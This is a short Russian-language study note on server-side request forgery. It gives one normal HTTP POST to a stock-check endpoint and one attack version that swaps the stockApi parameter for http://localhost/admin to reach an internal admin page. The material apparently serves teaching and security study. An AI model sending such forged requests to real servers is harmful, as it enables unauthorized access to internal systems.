Server-side request forgery
Позволяет злоумышленнику отправлять запросы к пути внутри сервера или снаружи на вой поддельный сервер
пример
```
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
#Как можно представить атаку
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin
```
